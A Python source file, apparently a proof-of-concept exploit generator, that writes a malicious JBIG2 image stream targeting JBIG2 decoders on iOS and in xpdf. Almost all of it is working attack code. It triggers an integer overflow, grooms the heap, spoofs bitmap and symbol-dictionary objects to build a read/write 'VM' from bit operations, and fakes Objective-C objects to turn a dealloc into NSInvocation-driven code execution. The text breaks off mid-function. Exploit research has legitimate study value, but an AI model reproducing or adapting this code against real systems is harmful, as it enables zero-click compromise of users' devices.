from constants import *
from segments import *
import hexdump, sys, time


def unbound_page(f):
	# needed to appease a check for a page before storing bitmaps. This
	# page will be swapped out during the heap spray later, and the size is
	# eventually corrupted
	f.write(create_page_info_bytes(1))

	# store a dictionary seg to trigger overflow quickly
	overflow_sds_0xffff = create_0xffff_sds()
	overflow_sds_0xffff_sh = segmentHeader(overflow_sds_0xffff_segnum, 0, 1, 0, 
		len(overflow_sds_0xffff.raw())
	)
	f.write(overflow_sds_0xffff_sh.raw() + overflow_sds_0xffff.raw())

	# force 1 Quantum (0x10 bytes) mallocs to eat up all the free space in the heap
	for i in range(0, 0x1600):
		f.write(create_page_info_bytes(0x10))

	# set up segments Glist for resizing (reallocation). Segments already holds
	# 2 segments referenced for overflow, so need 0xe additional segments.
	# This will push Glist size up to 0x10, and will trigger a reallocation
	# of 0x20 * 0x8 (pointer size) = 0x100 on the next Symbol Dictionary Segment.
	for _ in range(0, 0xe):
		sds = create_0x1_sds()
		sds_sh = segmentHeader(segments_pad_sds_segnum, 0, 1, 0, len(sds.raw()))
		f.write(sds_sh.raw() + sds.raw())
	
	# allocate 0x80, 0x80, 0x40, and 0x90 in that order while triggering reallocation of Glist
	heap_feng_shui = create_heap_feng_shui_0x80_0x80_0x40_0x90_sds()
	heap_feng_shui_sh = segmentHeader(heap_feng_shui_sds_segnum, 0, 1, 0, len(heap_feng_shui.raw()))
	f.write(heap_feng_shui_sh.raw() + heap_feng_shui.raw())
	
	# consume some freed blocks
	f.write(create_page_info_bytes(0x10))
	
	# allocate page that will be exploited
	f.write(create_page_info_bytes(0x80, segnum=4)) # refactor TODO: remove after confirmed refactor, no need

	# trigger the vuln with a textRegionSegment
	trs = textRegionSegment(1, 1, 0, 0, 0, 0, 1, encoded_bytes.stolen_trs_bytes)
	
	"""
	The references below need to overflow to undersized_buffer_allocation_size: 0x100000003
	
	Everything after the first segment isn't written as segments is corrupted, but is necessary
	to trigger the overflow during syms size calculation
	"""
	# reference a seg of length 0x27 precisely corrupt the segments list and pageBitmap's h value
	ref_seg_bytes = overflow_sds_0x27_segnum.to_bytes(1, "big")
	# current syms size is 0x27

	# calculation. pad sds is of size 1, increment granularly
	undersized_buffer_allocation_size = 0x18
	ref_seg_bytes += segments_pad_sds_segnum.to_bytes(1, "big") * (0xFFD9 + (undersized_buffer_allocation_size // 8))
	# current syms size is 0x10003
	
	# refers to an sds of size 0xFFFF stored in the corrupted segments buffer, won't get written
	ref_seg_bytes += 0x10000 * overflow_sds_0xffff_segnum.to_bytes(1, "big")
	# current syms size is 0x100000003 -> 0x3 (pointers, so a 0x18 allocation)
	
	pad = ((len(ref_seg_bytes) + 9) >> 3) * b"\x00"
	trs_sh = segmentHeaderWithRefSegsLarge(overflow_trigger_trs_segnum, 
		0x6,
		0xE0000000 + len(ref_seg_bytes), 
		pad + ref_seg_bytes,
		1, 
		len(trs.raw())
	)
	f.write(trs_sh.raw() + trs.raw())

	# necessary in XPDF only:	
	# 	fail a sanity check but set pageW and pageH to large values so subsequent reads will work 
	# 	this actually doesn't seem to be necessary on iOS but was necessary when exploiting xpdf
	# 	pis = pageInfoSegment(0xffffffff, 0xfffffffe, 0, 0, 0, 0)
	# 	pis_sh = segmentHeader(0xffffffff, 0x30, 0, 1, len(pis.raw()))	
	# 	f.write(pis_sh.raw() + pis.raw())

	# during corruption w is set to 1
	# use a non-standard write to make w large
	# to allow normal width based writes to succeed
	grrs = genericRefinementRegionSegment(0x1, 0x1, 0, data_buffer_to_bitmap_w + 2, OR, 0, [0,0], [0,0], encoded_bytes.encoded_1_bit)
	grrs_sh = segmentHeader(0xffffffff, COMBINE, 0, 1, len(grrs.raw()))
	f.write(grrs_sh.raw() + grrs.raw())

	# overwrite pageBitmaps h and w values to fully unbound operations
	or_bytes_at_offset(f, data_buffer_to_bitmap_w, struct.pack("<I", 0x7FFFFFFF))
	or_bytes_at_offset(f, data_buffer_to_bitmap_h, struct.pack("<I", 0x7FFFFFFF))

	"""
	Done triggering the vulnerability and unbounding the page!
	"""
	return
	
def transition_vm(f):
		"""
		New desired VM layout

		0 1 2 3 4 5 6 7
		+-+-+-+-+-+-+-+-+ 0x0 ------------------------
	+->	|     vtable    |		1st Spoofed Bitmap
	|	+-+-+-+-+-+-+-+-+ 0x8
	|	|segNum |   w   |
	|	+-+-+-+-+-+-+-+-+ 0x10
	|	|   h   | line  |
	|	+-+-+-+-+-+-+-+-+ 0x18
	|	|     *data     |
	|	+-+-+-+-+-+-+-+-+ 0x20 -----------------------
	|	|     flags     |           Registers/VM
	|	+-+-+-+-+-+-+-+-+ 0x28
	+-- |*spoofedBitmap | <------------------------------+
		+-+-+-+-+-+-+-+-+ 0x30                           |
	+-- |*spoofedBitmap |                                |
	|	+-+-+-+-+-+-+-+-+ 0x38                           |
	|	|      RCX      |                                |
	|	+-+-+-+-+-+-+-+-+ 0x40                           |
	|	|      RDX      |                                |
	|	+-+-+-+-+-+-+-+-+ 0x48 -----------------------   |
	|	|     vtable    |        Spoofed Symbol          |
	|	+-+-+-+-+-+-+-+-+ 0x50   Dictionary Segment      |
	|	|segNum | size  |                                |
	|	+-+-+-+-+-+-+-+-+ 0x58                           |
	|	|   **bitmaps   | -------------------------------+
	|	+-+-+-+-+-+-+-+-+ 0x60 -----------------------  
	+-> |     vtable    |		2nd Spoofed Bitmap
		+-+-+-+-+-+-+-+-+ 0x68  
		|segNum |   w   |       
		+-+-+-+-+-+-+-+-+ 0x70  
		|   h   | line  | 
		+-+-+-+-+-+-+-+-+ 0x78
		|    data       | 
		+-+-+-+-+-+-+-+-+ 0x80
		"""
		# set up 2nd bitmap 
		
		# this value can be larger than what we intend to read
		replace_bytes_at_offset(f, spoofed_bitmap_w, struct.pack("<I", 64*3))
		
		# rbx is now the 2nd bitmap pointer, rax is the 1st
		replace_bytes_at_offset(f, rbx, struct.pack("<Q",spoofed_bitmap2))
		add64(f, rbx, storage1)
		
		# copy all of the previously spoofed bitmap
		replace_offset_to_offset(f, spoofed_bitmap2, spoofed_bitmap, 0x20)
		
		# since new sds after migration is always the second de segnum referenced in segments, never dereffed by accident
		replace_bytes_at_offset(f, spoofed_bitmap2_w, struct.pack("<I", 64*2))

		# refactor TODO: refactor for clarity, this can be removed
		# point 2nd bitmap's data to the 1st spoofed bitmap's data pointer
		replace_bytes_at_offset(f, spoofed_bitmap2_data, struct.pack("<Q",spoofed_bitmap_data))
		
		# storage1 is also spoofed_bitmap2_data, so can't be closed
		add64(f, spoofed_bitmap2_data, data_buffer_to_bitmap_data) # refactor TODO: this is redundant right?

		replace_bytes_at_offset(f, spoofed_sds_size,  struct.pack("<I",2))
		# second fake bitmap should be set up!


def setup_vm(f):
		"""
		Original VM layout (a modified version of this layout is used in practice)
		The spoofed SDS and Bitmap allow for pointer dereferencing

		 0 1 2 3 4 5 6 7
		+-+-+-+-+-+-+-+-+ 0x0 ------------------------
	+->	|     vtable    |			Spoofed Bitmap
	|	+-+-+-+-+-+-+-+-+ 0x8
	|	|segNum |   w   |
	|	+-+-+-+-+-+-+-+-+ 0x10
	|	|   h   | line  |
	|	+-+-+-+-+-+-+-+-+ 0x18
	|	|     *data     |
	|	+-+-+-+-+-+-+-+-+ 0x20 -----------------------
	|	|     flags     |           Registers/VM
	|	+-+-+-+-+-+-+-+-+ 0x28
	|	|      RAX      |
	|	+-+-+-+-+-+-+-+-+ 0x30
	|	|      RBX      | 
	|	+-+-+-+-+-+-+-+-+ 0x38
	|	|      RCX      |
	|	+-+-+-+-+-+-+-+-+ 0x40
	|	|      RDX      |
	|	+-+-+-+-+-+-+-+-+ 0x48 -----------------------
	|	|     vtable    |        Spoofed Symbol 
	|	+-+-+-+-+-+-+-+-+ 0x50   Dictionary Segment
	|	|segNum | size  |
	|	+-+-+-+-+-+-+-+-+ 0x58
	|	|   **bitmaps   | ------+
	|	+-+-+-+-+-+-+-+-+ 0x60  |
	|	|*genRegionStats|       |
	|	+-+-+-+-+-+-+-+-+ 0x68  |
	|	|*refRegionStats|       |
	|	+-+-+-+-+-+-+-+-+ 0x70  |
	+-- |*spoofedBitmap | <-----+ 
		+-+-+-+-+-+-+-+-+ 0x78 -----------------------
		|    storage    |        Storage slot
		+-+-+-+-+-+-+-+-+ 0x80
		"""

		"""
		Spoof a jbig2 bitmap @ 0x0 - 0x20 in pageBitmap

		 0 1 2 3 4 5 6 7
		+-+-+-+-+-+-+-+-+ 0x0
		|     vtable    |
		+-+-+-+-+-+-+-+-+ 0x8
		|segNum |   w   |
		+-+-+-+-+-+-+-+-+ 0x10
		|   h   | line  |
		+-+-+-+-+-+-+-+-+ 0x18
		|      data     |
		+-+-+-+-+-+-+-+-+ 0x20
		"""
		
		"""
		To fake a JBIG2Bitmap object we must find the vtable value. During the overflow trigger, a
		bitmap was allocated and almost always resides behind the page buffer in the heap. Doing a relative
		search in front of the pageBitmap will reliably find a vtable
		"""
		
	
		# bitmap is usually allocated @ data_buffer_to_known_good_bitmap
		# bitmap is always allocated within 0x400 after data_buffer_to_known_good_bitmap
		bitmap_search_length = 0x400
		# example value: 0x00000001e30ea648
		# look for the lower bits, abusing the fact that all allocation pointers are 0x10 aligned.
		# this makes it very unlikely to find a value ending in 0x648 that isn't a vtable
		replace_bytes_at_offset(f, rax, struct.pack("<Q", 0x648))
		# rcx will have the searched value ORed onto it, so 0 it out
		replace_bytes_at_offset(f, rcx, struct.pack("<Q", 0))
		# zero out all flags
		replace_bytes_at_offset(f, flags, struct.pack("<B", 0))
		# store a 1 bit at a known location
		xnor_bits_offset_to_offset(f, relative_search_always_1, relative_search_always_1)
		# zero out the previously found bit
		xor_bits_offset_to_offset(f, relative_search_previously_found, relative_search_previously_found)

		# bitmap (and vtable) will be allocated 0x10 aligned, so no need to check every other pointer
		for p in range(data_buffer_to_bitmap + 0x20, data_buffer_to_known_good_bitmap + bitmap_search_length, 0x10):
			"""
			Searching for a value matching input bytes can be achieved as follows:
				* zero out the destination register (rcx)
				* copy the current search target (p) to a register (rbx)
				* perform an XNOR operation on the search target and input bytes
					* AND the result of each bit with the accumulator
					* At this point, if accumulator holds 1, a matching value has been found
				* AND the accumulator into rbx
					* if a match was found, this has no effect
					* if a match wasn't found, rbx is now 0
				* OR rbx into rcx 

			By clearing the accumulator if a match has been previously found, the first match will be
			stored in rcx
			"""
			replace_offset_to_offset(f, rbx, p, 0x8)
			# reset accumulator
			xnor_bits_offset_to_offset(f, relative_search_accumulator, relative_search_accumulator)
			
			# only compare bits necessary to check for 0x648 presence
			for i in range(0, 0xc):
				# bit math to check LSB in little endian
				src1_bit = ((rax + i // 8) << 3) + (7 - (i % 8))
				src2_bit = ((p + i // 8) << 3) + (7 - (i % 8))
				"""
				To compare bits, we can use XNOR. XNOR outputs a 1 when the two input values match. By XNORing each bit, then
				ANDing those results onto a bit set to 1 initially, we can produce a 1 when all bits are equal, and a 0 when
				there exists a difference. 
				XNOR:	._____________.
						| A | B | Out |
						+-------------+
						| 0 | 0 |  1  |
						| 0 | 1 |  0  |
						| 1 | 0 |  0  |
						| 1 | 1 |  1  |
						+-------------+
				"""
				replace_bits_offset_to_offset(f, relative_search_xnor_bit, src1_bit)
				xnor_bits_offset_to_offset(f, relative_search_xnor_bit, src2_bit)
				and_bits_offset_to_offset(f, relative_search_accumulator, relative_search_xnor_bit)

			# accumulator will be 1 if equal, 0 if not

			# relative_search_previously_found is set at the very end of each iteration, means a result was previously found.
			# this is to ensure we save the first value ending in 0x648 to make this search slightly more reliable
			replace_bits_offset_to_offset(f, relative_search_not_bit, relative_search_previously_found)
			# xor with 1 is a NOT op
			xor_bits_offset_to_offset(f, relative_search_not_bit, relative_search_always_1)

			# if not previously found, relative_search_not_bit now holds 1. Else it holds 0. This logic MUST come before
			# the actual setting of relative_search_previously_found to account for the case where the very
			# first searched pointer is the desired value

			# mark as found if found
			# relative_search_previously_found will always stay on once flipped
			or_bits_offset_to_offset(f, relative_search_previously_found, relative_search_accumulator)
			
			# null out all future finds if one has been found
			# null out rbx (searched value) when not matching
			# f.write(debug_sh.raw())
			for i in range(0, 0x40):
				dst_bit = ((rbx + i // 8) << 3) + (7 - (i % 8))
				#or_bits_offset_to_offset(f, dst_bit, local_accumulator)

				# work around ANDing the LSB always resulting in 1 if dst is 1. This is such odd behavior, but 
				# easier to work around than debug (did try debugging though :dizzy:)
				replace_bits_offset_to_offset(f, relative_search_and_workaround_bit, dst_bit)
				# rbx must be both found, and be the first found value. AND the accumulator to check for rbx being "found"
				and_bits_offset_to_offset(f, relative_search_and_workaround_bit, relative_search_accumulator)
				# now check for "first found". Must null out value if one has already been found by ANDing relative_search_not_bit
				and_bits_offset_to_offset(f, relative_search_and_workaround_bit, relative_search_not_bit) # inverse of previously found
				# move the "checked" bit back into rbx
				replace_bits_offset_to_offset(f, dst_bit, relative_search_and_workaround_bit)

			# rbx has now been nulled out if it either didn't match 0x648 or if a match has already been found
			# if a value was found, and it was the first, copy it into rcx
			for i in range(0, 0x40):
				src_bit = ((rbx + i // 8) << 3) + (7 - (i % 8))
				dst_bit = ((rcx + i // 8) << 3) + (7 - (i % 8))
				# ORs with a nulled out rbx are NOPs
				or_bits_offset_to_offset(f, dst_bit, src_bit)

		# done the relative search for a JBIG2Bitmap vtable, value is now in rcx!

		# Copy vtable from the search dst register into the spoofed bitmap's vtable
		replace_offset_to_offset(f, spoofed_bitmap_vtable, rcx, 0x8)
		
		# Store pointer to original pageBitmap data buffer, this will be used
		# to make multiple calculations	later

		replace_offset_to_offset(f, storage1, data_buffer_to_bitmap_data, 8) # refactor TODO: remove this, not needed
		
		# setup spoofed bitmap values
		replace_bytes_at_offset(f, spoofed_bitmap_segnum, struct.pack("<I", 0xdeadbeef))
		replace_bytes_at_offset(f, spoofed_bitmap_w, struct.pack("<I", 0x40))
		replace_bytes_at_offset(f, spoofed_bitmap_h, struct.pack("<I", 1))
		replace_bytes_at_offset(f, spoofed_bitmap_line, struct.pack("<I", 1))
		# data pointer will be populated later

		"""
		Spoof a Symbol Dictionary Segment that references the spoofed jbig2 bitmap

		 0 1 2 3 4 5 6 7
		+-+-+-+-+-+-+-+-+ 0x0
		|     vtable    |
		+-+-+-+-+-+-+-+-+ 0x8
		|segNum | size  |
		+-+-+-+-+-+-+-+-+ 0x10
		|   **bitmaps   | ------+
		+-+-+-+-+-+-+-+-+ 0x18  |
		|      data     |       |
		+-+-+-+-+-+-+-+-+ 0x20  |
		|*genRegionStats|       |
		+-+-+-+-+-+-+-+-+ 0x28  |
		|*refRegionStats|       |
		+-+-+-+-+-+-+-+-+ 0x30  |
		|*spoofedBitmap | <-----+ 
		+-+-+-+-+-+-+-+-+ 0x38
		spoofedBitmap isn't part of the canonical struct, rather it's a portion of
		the pageBitmap used to store a pointer to the spoofed bitmap. The SDS
		sees a list of size 1 that includes the spoofed bitmap
		"""

		# first calculation coming up, 0 registers for sanity. VM is created in original page buffer allocation,
		# so these should be 0 anyway
		zero_all_register(f)
		# calculate vtable for jbig2 symbol dict, as we only have a bitmap vtable
		# copy vtable into rax
		replace_offset_to_offset(f, rax, spoofed_bitmap_vtable, 8) # refactor TODO: consolidate adds
		# load vtable difference into rbx
		replace_bytes_at_offset(f, rbx, struct.pack("<I", bitmap_vtable_to_sds_vtable)) 
		add64(f, rax, rbx)
		# write vtable
		replace_offset_to_offset(f, spoofed_sds_vtable, rax, 8)
		# populate segnum
		replace_bytes_at_offset(f, spoofed_sds_segnum, struct.pack("<I", 0xde))
		# populate size
		replace_bytes_at_offset(f, spoofed_sds_size, struct.pack("<I", 0x1))

		"""
		refactor TODO: can we get rid of storage and mark all of these as unused?
		Modified VM layout
		To save space, and make another contiguous block for a 2nd pointer later,
		this is the VM layout used. Repurpose RAX as the spoofedBitmap pointer, reserving
		0x60 - 0x80 to create another bitmap eventually. 

		 0 1 2 3 4 5 6 7
		+-+-+-+-+-+-+-+-+ 0x0 ------------------------
	+->	|     vtable    |			Spoofed Bitmap
	|	+-+-+-+-+-+-+-+-+ 0x8
	|	|segNum |   w   |
	|	+-+-+-+-+-+-+-+-+ 0x10
	|	|   h   | line  |
	|	+-+-+-+-+-+-+-+-+ 0x18
	|	|     *data     |
	|	+-+-+-+-+-+-+-+-+ 0x20 -----------------------
	|	|     flags     |           Registers/VM
	|	+-+-+-+-+-+-+-+-+ 0x28
	+-- |*spoofedBitmap | <------------------------------+
		+-+-+-+-+-+-+-+-+ 0x30                           |
		|      RBX      |                                |
		+-+-+-+-+-+-+-+-+ 0x38                           |
		|      RCX      |                                |
		+-+-+-+-+-+-+-+-+ 0x40                           |
		|      RDX      |                                |
		+-+-+-+-+-+-+-+-+ 0x48 -----------------------   |
		|     vtable    |        Spoofed Symbol          |
		+-+-+-+-+-+-+-+-+ 0x50   Dictionary Segment      |
		|segNum | size  |                                |
		+-+-+-+-+-+-+-+-+ 0x58                           |
		|   **bitmaps   | -------------------------------+
		+-+-+-+-+-+-+-+-+ 0x60  
		|*genRegionStats|       
		+-+-+-+-+-+-+-+-+ 0x68  
		|*refRegionStats|       
		+-+-+-+-+-+-+-+-+ 0x70  
		|    unused     | 
		+-+-+-+-+-+-+-+-+ 0x78 -----------------------
		|    storage    |        Storage slot
		+-+-+-+-+-+-+-+-+ 0x80

		"""


		# calculate pointer to spoofed *bitmap array
		# load offset into rax
		replace_bytes_at_offset(f, rax, struct.pack("<Q", rax))
		# load base addr into rax
		add64(f, rax, storage1)
		# move calculated pointer into spoofed sds
		replace_offset_to_offset(f, spoofed_sds_bitmaps, rax, 8)
		
		# set rax to point to the spoofed bitmap
		replace_offset_to_offset(f, rax, storage1, 8)

		# load offset to spoofed sds into rbx
		replace_bytes_at_offset(f, rbx, struct.pack("<I", spoofed_sds))

		# base addr still in storage
		add64(f, rbx, storage1)

		# now have a pointer to the 1st spoofed sds in rbx, this will be written into segments
		"""
		Construction of primitive is almost complete! Must insert the spoofed SDS into segments,
		then calculate the address to read
		"""
		# insert spoofed sds into list
		# First fill up list. Need to have the maximum room to write a pointer in dynamically.
		flush_overflow_segments(f)
		# segments now contains 0x1f segments with the segnum 0xc0ffee.
		# these are placeholders that will be consumed and replaced by other functions

		# very neat trick, readers are encouraged to look at this function!
		insert_register_into_segments(f, rbx)
		

def create_fake_objc_invalidate_chain(f):
	"""
	Ultimately want to kick off this chain to convert a dealloc to an [NSInvocation invoke] call

	void __cdecl -[LSProgressNotificationTimer dealloc](LSProgressNotificationTimer *self, SEL a2)
	{
		// -[LSProgressNotificationTimer dealloc]    CoreServices:__text    0x180751004
		objc_super v3; // [xsp+0h] [xbp-20h] BYREF

		-[NSTimer invalidate](self->_timer, "invalidate");
		v3.receiver = self;
		v3.super_class = (Class)&OBJC_CLASS___LSProgressNotificationTimer;
		-[NSObject dealloc](&v3, "dealloc");
	}

	id __cdecl -[_UIViewServiceTextEffectsOperator invalidate](_UIViewServiceTextEffectsOperator *self, SEL a2)
	{
		// -[_UIViewServiceTextEffectsOperator invalidate]    UIKitCore:__text    0x1830BE96C
		return -[_UIAsyncInvocation invoke](self->_invalidationInvocation, "invoke");
	}
	"""

	"""
	ObjC object faking offsets
	"""

	# first grab base address of dyld shared cache, and save in rdx. This will be used frequently
	static_jbig2_bitmap_vtable_offset = static_jbig2_bitmap_vtable_base_addr - static_dyld_shared_cache_base		
	replace_bytes_at_offset(f, rdx, struct.pack("<Q", negative(static_jbig2_bitmap_vtable_offset)))
	add64(f, rdx, spoofed_bitmap_vtable)
	# now have base address of dyld shared cache in rdx
	
	# LOTS of fake objc offsets below that aren't defined in constants. Why?
	# for my sanity, didn't want to refactor and rename everything with a "_"

	# begin faking objects directly after pageBitmap's buffer
	# this memory was corrupted during the initial overflow, we can use it with a high degree 
	# of certainty regarding stability if we haven't crashed yet

	# Sizes of fake objects
	NSInvocation_size = 0x38
	_frame_size = 0x18
	_signature_size = 0x18
	frame_head_size = 0x18
	frame_elem_size = 0x28
	NSConcreteMutableData_size = 0x28
	LSProgressNotificationTimer_size = 0x40
	_UIViewServiceTextEffectsOperator_size = 0x88
	NSData_size = 0x28

	# NSConcreteMutableData offsets
	NSConcreteMutableData__lengthOffset = 0x10
	NSConcreteMutableData__capacityOffset = 0x18
	NSConcreteMutableData__bytesOffset = 0x20

	# NSInvocation offsets
	NSInvocation__frameOffset = 0x8
	NSInvocation__signatureOffset = 0x18
	NSInvocation__magicOffset = 0x30

	# _frame offsets
	_frame_target_class_offset = 0
	_frame_selector_offset = 8
	_frame_arg_offset = 0x10


	# LSProgressNotificationTimer offsets
	_timerOffset = 0x10

	# _UIViewServiceTextEffectsOperator offsets
	_invalidationInvocationOffset = 0x28

	# fake object offsets from pageBitmap
	_UIViewServiceTextEffectsOperatorOffset = 0x80

	# offsets + size declarations
	calculated_magic_cookie_offset = 0x1D8ECDB30 - static_dyld_shared_cache_base
	calculated_NSInvocationClass_offset = 0x1D8EC7458 - static_dyld_shared_cache_base
	calculated_NSConcreteMutableDataClass_offset = 0x1D8ECF300 - static_dyld_shared_cache_base
	calculated_NSKeyedUnarchiverClass_offset = 0x1D8ED0C28 - static_dyld_shared_cache_base
	calculated_sel_unarchiveObjectWithData_offset = 0x1CB0027D8 - static_dyld_shared_cache_base
	calculated_NSMethodSignatureClass_offset = 0x1D8EC73B8 - static_dyld_shared_cache_base
	calculated__UIViewServiceTextEffectsOperatorClass_offset = 0x1D8F272C0 - static_dyld_shared_cache_base

	NSInvocationOffset = _UIViewServiceTextEffectsOperatorOffset + _UIViewServiceTextEffectsOperator_size
	_frameOffset = NSInvocationOffset + NSInvocation_size
	NSDataOffset = _frameOffset + _frame_size
	_signatureOffset = NSDataOffset + NSConcreteMutableData_size
	frame_headOffset = _signatureOffset + _signature_size
	frame_ret_valueOffset = frame_headOffset + frame_elem_size # just one frame element
	all_frame_elemsOffset = frame_ret_valueOffset + (frame_elem_size * 3) # three frame elements, 

	"""
	-[LSProgressNotificationTimer dealloc] will kick off this chain, but will be faked after
	a page hop. Begin with the second object

	id __cdecl -[_UIViewServiceTextEffectsOperator invalidate](_UIViewServiceTextEffectsOperator *self, SEL a2)
	{
		return -[_UIAsyncInvocation invoke](self->_invalidationInvocation, "invoke");
	} 
	"""

	#zero out everything before starting, all objects are faked contiguously
	for i in range(_UIViewServiceTextEffectsOperatorOffset, all_frame_elemsOffset, 8):
		zero_8_bytes(f, i)


	# _UIViewServiceTextEffectsOperator
	# set isa pointer
	replace_bytes_at_offset(f, _UIViewServiceTextEffectsOperatorOffset, struct.pack("<Q", calculated__UIViewServiceTextEffectsOperatorClass_offset))
	add64(f, _UIViewServiceTextEffectsOperatorOffset, rdx)

	# _UIViewServiceTextEffectsOperator->_invalidationInvocation
	curr_pointer_offset = _UIViewServiceTextEffectsOperatorOffset + _invalidationInvocationOffset
	replace_bytes_at_offset(f, curr_pointer_offset, struct.pack("<Q", NSInvocationOffset))
	add64(f, curr_pointer_offset, storage1) # refactor TODO: get pointer to NSInvocation obj
	
	# NSInvocation
	# set isa pointer
	replace_bytes_at_offset(f, NSInvocationOffset, struct.pack("<Q", calculated_NSInvocationClass_offset))
	add64(f, NSInvocationOffset, rdx)

	# set magic cookie pointer with arb read primitive
	# sometimes this is null, which affects stability, not interested in improving for a PoC
	# modify jbig2bitmap pointer to point to magic_cookie's address
	replace_bytes_at_offset(f, spoofed_bitmap_data, struct.pack("<Q", calculated_magic_cookie_offset))
	add64(f, spoofed_bitmap_data, rdx)
	# refactor TODO: change these bytes. Likely should be make_deref_imm_textregion_stream2 to 0 index into spoofed sds
	# generalize arbitrary read trigger to function
	trs = textRegionSegment(64, 1, (NSInvocationOffset + NSInvocation__magicOffset) << 3, 0, REPLACE, 0, 1, b"\xa9\x1e\x7f\xff\xac")
											# 0x20 is 1 << 5, how nRefSegs is calced 
	trs_sh = segmentHeaderWithRefSegs(6, 6, 0x20, b"\xde", 1, len(trs.raw()))

	# refactor TODO: remove these debugs
	f.write(ad_hoc_57_sh.raw())
	f.write(trs_sh.raw() + trs.raw())
	f.write(ad_hoc_57_sh.raw())

	# // populate frame value
	# memcpy(rawFakeInvocationPtr + _frameOffset, &_frame, 8);
	curr_pointer_offset = NSInvocationOffset + NSInvocation__frameOffset
	replace_bytes_at_offset(f, curr_pointer_offset, struct.pack("<Q", _frameOffset))
	add64(f, curr_pointer_offset, storage1)

	# // populate signature value
	# memcpy(rawFakeInvocationPtr + _signatureOffset, &_signature, 8);
	curr_pointer_offset = NSInvocationOffset + NSInvocation__signatureOffset
	replace_bytes_at_offset(f, curr_pointer_offset, struct.pack("<Q", _signatureOffset))
	add64(f, curr_pointer_offset, storage1)

	# _frame
	# _frame_target_class_offset = 0
	# _frame_selector_offset = 8
	# _frame_arg_offset = 0x10
	# memcpy(_frame, &calculated_NSKeyedUnarchiverClass_addr, 8); // target object, faked NSExpresion
	# calculated_NSKeyedUnarchiverClass_offset
	replace_bytes_at_offset(f, _frameOffset + _frame_target_class_offset, struct.pack("<Q", calculated_NSKeyedUnarchiverClass_offset))
	add64(f, _frameOffset  + _frame_target_class_offset, rdx)
	
	# memcpy(_frame + 8, &calculated_sel_unarchiveObjectWithData_addr, 8); // selector, expressionValueWithObject:context:
	replace_bytes_at_offset(f, _frameOffset + _frame_selector_offset, struct.pack("<Q", calculated_sel_unarchiveObjectWithData_offset))
	add64(f, _frameOffset  + _frame_selector_offset, rdx)

	# memcpy(_frame + 0x10, &rawFakeNSConcreteMutableDataPtr, 8); // NSConcreteMutableData*
	curr_pointer_offset = _frameOffset + _frame_arg_offset
	replace_bytes_at_offset(f, curr_pointer_offset, struct.pack("<Q", NSDataOffset))
	add64(f, curr_pointer_offset, storage1)

	# memcpy(rawFakeNSConcreteMutableDataPtr, &calculated_NSConcreteMutableDataClass_addr, 8);
	replace_bytes_at_offset(f, NSDataOffset, struct.pack("<Q", calculated_NSConcreteMutableDataClass_offset))
	add64(f, NSDataOffset, rdx) # rdx holds base of dyld shared cache
	# tmp = [initialExecutionArchive length];
	# memcpy(rawFakeNSConcreteMutableDataPtr + _lengthOffset, &tmp, 8);
	# memcpy(rawFakeNSConcreteMutableDataPtr + _capacityOffset, &tmp, 8);
	
	# get unencoded size
	file_contents = b""
	with open("compressedInitialExecutionArchive", "rb") as file:
		file_contents = file.read()
	initial_execution_archive_compressed_size = len(file_contents)

	replace_bytes_at_offset(f, NSDataOffset + NSConcreteMutableData__lengthOffset, struct.pack("<Q", initial_execution_archive_compressed_size))
	replace_bytes_at_offset(f, NSDataOffset + NSConcreteMutableData__capacityOffset, struct.pack("<Q", initial_execution_archive_compressed_size))
	
	# NSData->_bytes will be set later
	# tmp = [initialExecutionArchive bytes];
	# memcpy(rawFakeNSConcreteMutableDataPtr + _bytesOffset, &tmp, 8);
	
	
	# frame is now setup, move on to signature

	# _signature	
	# set isa pointer
	replace_bytes_at_offset(f, _signatureOffset, struct.pack("<Q", calculated_NSMethodSignatureClass_offset))
	add64(f, _signatureOffset, rdx)
	#memcpy(_signature + 8, &frame_head, 8);
	curr_pointer_offset = _signatureOffset + 8 # _signature->frame_head offset
	replace_bytes_at_offset(f, curr_pointer_offset, struct.pack("<Q", frame_headOffset))
	add64(f, curr_pointer_offset, storage1)
	replace_bytes_at_offset(f, _signatureOffset+0x10, struct.pack("<Q", 0)) # zero out last part of struct


	# frame_head	
	# memcpy(frame_head, &frame_ret_value, 8);
	curr_pointer_offset = frame_headOffset 
	replace_bytes_at_offset(f, curr_pointer_offset, struct.pack("<Q", frame_ret_valueOffset))
	add64(f, curr_pointer_offset, storage1)
	# memcpy(frame_head + 8, &first_frame_elem, 8);
	curr_pointer_offset = frame_headOffset + 8
	replace_bytes_at_offset(f, curr_pointer_offset, struct.pack("<Q", all_frame_elemsOffset))
	add64(f, curr_pointer_offset, storage1)
	# tmp = 0x000000e000000003; // frame size + num args (3)
	# memcpy(frame_head + 0x10, &tmp, 8);
	replace_bytes_at_offset(f, frame_headOffset+0x10, struct.pack("<Q", 0x000000e000000003))

	## frame_ret_value
	# frame_ret_value = make_frame_descriptor_list(1);
	""" 
	void* (^make_frame_descriptor_list)(int) = ^(int num_args)
	{
		void *last = 0x0;
		for(long long i = num_args - 1; i >= 0 ; i--) {
			void* elem = malloc(0x28);
			memset(elem, 0, 0x28);
			memcpy(elem + 0x8, &last, 8); // next element
			unsigned long long tmp = 8;//
			memcpy(elem + 0x10, &tmp, 8); // memory offset and size
			tmp = (i*8) << 32 | 0x8;
			memcpy(elem + 0x18, &tmp, 8); // frame offset and size
			tmp = 0x0000515100000000;
			memcpy(elem + 0x20, &tmp, 8); // flags
			last = elem;
		}
		return last;
	};
	"""
	replace_bytes_at_offset(f, frame_ret_valueOffset, struct.pack("<Q", 0x0))
	# last element
	replace_bytes_at_offset(f, frame_ret_valueOffset+0x8, struct.pack("<Q", 0x0))
	replace_bytes_at_offset(f, frame_ret_valueOffset+0x10, struct.pack("<Q", 0x8))
	# (i*8) << 32 | 0x8
	replace_bytes_at_offset(f, frame_ret_valueOffset+0x18, struct.pack("<Q", 0x8))
	# flags
	replace_bytes_at_offset(f, frame_ret_valueOffset+0x20, struct.pack("<Q", 0x0000515100000000))


	## all_frame_elems
	# first_frame_elem = make_frame_descriptor_list(3); // 3 args: obj, sel, unarchiveObjectWithData:archive
	# elem 2 (first elem)
	replace_bytes_at_offset(f, all_frame_elemsOffset, struct.pack("<Q", 0x0))
	# last element
	curr_pointer_offset = all_frame_elemsOffset + 8
	replace_bytes_at_offset(f, curr_pointer_offset, struct.pack("<Q", all_frame_elemsOffset + frame_elem_size))
	add64(f, curr_pointer_offset, storage1)
	replace_bytes_at_offset(f, all_frame_elemsOffset+0x10, struct.pack("<Q", 0x8))
	# (i*8) << 32 | 0x8
